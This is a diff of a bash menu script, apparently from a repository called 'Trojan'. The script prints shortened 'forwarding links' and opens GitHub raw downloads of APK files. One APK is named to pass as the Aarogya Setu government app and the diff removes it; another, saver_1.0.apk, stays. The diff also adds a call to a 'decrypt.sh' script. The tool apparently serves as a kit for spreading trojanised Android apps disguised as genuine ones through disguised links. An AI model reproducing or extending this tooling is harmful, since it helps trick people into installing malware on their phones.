@@ -65,27 +65,11 @@ printf $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m'
         then cd .server && bash config.sh
 
         elif [[ $char = "2" ]] || [[ $char = "02" ]]
-        then cd .files && bash config.sh
-echo
-sleep 0.8
-echo -e '\033[1;92mForwarding link: \033[0mhttps://tinyurl.com/y7ufkdfs'
-sleep 0.2
-echo
-printf '\033[1m[?] Are you want to Download with External Sources ? [Y/n] ' | lolcat -a -d 1 -s 100 -t
-read ask
-if  [[ $ask = "y" ]] || [[ $ask = "Y" ]]
-        then echo
-sleep 0.8
-echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s 100
-xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/gov.aarogya_setu_1.1.1.apk?raw=true'
-else cd .. && bash trojan.sh
+        then cd database && bash decrypt.sh
 fi
-echo
-sleep 1.0
-exit
 
         elif [[ $char = "3" ]] || [[ $char = "03" ]]
-        then cd .files && bash config+.sh
+        then cd .files && bash config.sh
 echo
 sleep 0.8
 echo -e '\033[0;92mForwarding link: \033[0mhttps://tinyurl.com/y8rm36ux'
@@ -100,9 +84,6 @@ echo -e '\033[1m[!] You will redirect to site...' | lolcat -a -t -d 1 -s
 xdg-open 'https://github.com/abhackerofficial/Trojan/blob/master/.files/saver_1.0.apk?raw=true'
 else cd .. && bash trojan.sh
 fi
-echo
-sleep 1
-exit
 
         elif [[ $char = "4" ]] || [[ $char = "04" ]]
         then
@@ -113,8 +94,7 @@ cd .files && bash update.sh
 
         elif [[ $char = "5" ]] || [[ $char = "05" ]]
         then
-clear
-exit
+exec echo
         else
 echo
         printf "\e[1;93m[!] Invalid option!\e[0m\n"
